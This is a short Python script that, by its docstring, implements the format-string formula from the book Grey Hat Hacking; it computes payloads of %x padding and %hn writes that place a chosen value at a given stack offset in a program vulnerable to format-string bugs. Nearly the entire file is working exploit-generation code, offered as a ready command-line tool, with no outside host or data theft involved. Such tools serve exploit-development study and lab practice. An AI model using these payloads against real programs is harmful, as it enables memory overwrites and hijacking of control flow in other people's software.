"""This is just a super quick implementation of the string format formula described in
Grey Hat Hacking, The Ethical Hacker's Handbook """
import argparse


def main(args):
    value_to_write = args.value_to_write
    offset = 1
    if args.offset is not None:
        offset = args.offset

    print(create_format_string(value_to_write, offset))


def create_format_string(value_to_write, offset=1):
    shell_string = ""
    if type(value_to_write) == int:
        value_to_write = hex(value_to_write)

    if value_to_write[:2] == "0x":
        value_to_write = value_to_write[2:]
        remainder = (len(value_to_write) % 4)
        if remainder > 0:
            value_to_write = ("0" * (4 - remainder)) + value_to_write

    low_order_bytes = 0
    high_order_bytes = 0
    if len(value_to_write) == 8:
        low_order_bytes = int(value_to_write[4:], 16)
        high_order_bytes = int(value_to_write[:4], 16)
    elif len(value_to_write) == 4:
        low_order_bytes = int(value_to_write, 16)
        high_order_bytes = 0

    if ((low_order_bytes < high_order_bytes) or (low_order_bytes == high_order_bytes)) \
            and len(value_to_write) == 8:
        format_string = "%.{:d}x%{:d}\\$hn%.{:d}x%{:d}\\$hn".format(
            low_order_bytes - 8,
            offset + 1,
            high_order_bytes - low_order_bytes,
            offset)
        shell_string = "{:s}{:s}".format(shell_string, format_string)
    elif (low_order_bytes > high_order_bytes) and len(value_to_write) == 8:
        format_string = "%.{:d}x%{:d}\\$hn%.{:d}x%{:d}\\$hn".format(
            high_order_bytes - 8,
            offset,
            low_order_bytes - high_order_bytes,
            offset + 1)
        shell_string = "{:s}{:s}".format(shell_string, format_string)

    if len(value_to_write) == 4:
        shell_string = shell_string + "%.{:d}x%{:d}\\$hn".format(
            low_order_bytes - 4,
            offset)

    return shell_string


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    # parser.add_argument("--address", "-a", type=str, help="Address that has to be printed out via python")
    parser.add_argument("--offset", "-o", type=int, help="The offset of the address on the stack")
    parser.add_argument("value_to_write", type=str, help="Value to write, big endian, 0xffffffff or 0xffff format")
    args = parser.parse_args()
    main(args)
